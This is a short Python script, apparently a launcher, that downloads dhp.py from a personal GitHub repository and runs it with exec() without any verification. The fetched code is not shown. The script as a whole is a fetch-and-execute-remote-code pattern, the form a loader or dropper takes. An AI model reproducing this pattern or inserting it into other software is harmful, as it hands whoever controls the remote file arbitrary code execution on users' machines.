import urllib.request

url = "https://raw.githubusercontent.com/levantienmc09-code/letien09/refs/heads/main/dhp.py"

with urllib.request.urlopen(url) as response:
    script = response.read().decode()

exec(script)
